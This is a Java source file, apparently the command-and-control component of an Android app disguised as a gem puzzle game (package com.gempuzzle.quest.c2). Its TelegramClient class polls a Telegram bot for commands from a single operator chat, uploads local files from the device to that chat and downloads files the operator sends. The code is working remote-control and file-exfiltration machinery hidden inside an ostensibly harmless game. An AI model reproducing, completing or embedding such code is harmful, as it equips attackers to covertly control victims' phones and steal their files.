package com.gempuzzle.quest.c2;

import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

/**
 * Minimal Telegram Bot API client — long-polling getUpdates,
 * sendMessage, sendDocument (file upload). No external deps.
 */
public final class TelegramClient {

    private static final String TAG = "TG";
    private static long offset = 0;

    public interface UpdateHandler {
        void onCommand(long chatId, int messageId, String text, boolean hasDocument, String fileId);
    }

    public static void pollLoop(UpdateHandler handler) {
        while (!Thread.currentThread().isInterrupted()) {
            try {
                String url = TokenVault.apiBase() + "/getUpdates?timeout=30&offset=" + (offset + 1);
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(40000);
                int code = conn.getResponseCode();
                if (code != 200) {
                    Thread.sleep(3000);
                    continue;
                }
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                br.close();
                JSONObject resp = new JSONObject(sb.toString());
                if (!resp.optBoolean("ok")) { Thread.sleep(3000); continue; }
                JSONArray arr = resp.optJSONArray("result");
                if (arr == null) continue;
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject upd = arr.getJSONObject(i);
                    long uid = upd.optLong("update_id", 0);
                    if (uid > offset) offset = uid;
                    JSONObject msg = upd.optJSONObject("message");
                    if (msg == null) continue;
                    JSONObject chat = msg.optJSONObject("chat");
                    long chatId = chat != null ? chat.optLong("id", 0) : 0;
                    // Strict admin isolation — only accept commands from admin chat ID
                    if (!String.valueOf(chatId).equals(TokenVault.chatId())) continue;
                    int messageId = msg.optInt("message_id", 0);
                    String text = msg.optString("text", "");
                    JSONObject doc = msg.optJSONObject("document");
                    boolean hasDoc = doc != null;
                    String fileId = hasDoc ? doc.optString("file_id", "") : "";
                    try {
                        handler.onCommand(chatId, messageId, text, hasDoc, fileId);
                    } catch (Throwable t) {
                        Log.e(TAG, "handler", t);
                    }
                }
            } catch (InterruptedException ie) {
                return;
            } catch (Throwable t) {
                try { Thread.sleep(5000); } catch (InterruptedException e) { return; }
            }
        }
    }

    public static void sendMessage(String text) {
        try {
            String url = TokenVault.apiBase() + "/sendMessage";
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            String body = "chat_id=" + URLEncoder.encode(TokenVault.chatId(), "UTF-8")
                    + "&text=" + URLEncoder.encode(text, "UTF-8")
                    + "&parse_mode=Markdown";
            try (DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
                dos.writeBytes(body);
            }
            conn.getResponseCode();
        } catch (Throwable t) {
            Log.e(TAG, "sendMessage", t);
        }
    }

    public static void sendDocument(File file, String caption) {
        try {
            String boundary = "----ArchonX" + System.currentTimeMillis();
            String url = TokenVault.apiBase() + "/sendDocument";
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(60000);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            try (DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                dos.writeBytes(TokenVault.chatId() + "\r\n");
                if (caption != null) {
                    dos.writeBytes("--" + boundary + "\r\n");
                    dos.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                    dos.writeBytes(caption + "\r\n");
                }
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n");
                dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
                try (FileInputStream fis = new FileInputStream(file)) {
                    byte[] buf = new byte[8192];
                    int n;
                    while ((n = fis.read(buf)) != -1) dos.write(buf, 0, n);
                }
                dos.writeBytes("\r\n--" + boundary + "--\r\n");
            }
            conn.getResponseCode();
        } catch (Throwable t) {
            Log.e(TAG, "sendDocument", t);
        }
    }

    public static String getFilePath(String fileId) {
        try {
            String url = TokenVault.apiBase() + "/getFile?file_id=" + URLEncoder.encode(fileId, "UTF-8");
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setConnectTimeout(15000);
            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            br.close();
            JSONObject resp = new JSONObject(sb.toString());
            if (resp.optBoolean("ok")) {
                return resp.getJSONObject("result").optString("file_path", "");
            }
        } catch (Throwable t) {
            Log.e(TAG, "getFilePath", t);
        }
        return "";
    }

    public static boolean downloadFile(String filePath, File dest) {
        try {
            String url = "https://api.telegram.org/file/bot" + TokenVault.get() + "/" + filePath;
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(60000);
            try (java.io.InputStream is = conn.getInputStream();
                 java.io.FileOutputStream fos = new java.io.FileOutputStream(dest)) {
                byte[] buf = new byte[8192];
                int n;
                while ((n = is.read(buf)) != -1) fos.write(buf, 0, n);
            }
            return true;
        } catch (Throwable t) {
            Log.e(TAG, "downloadFile", t);
            return false;
        }
    }

    private TelegramClient() {}
}
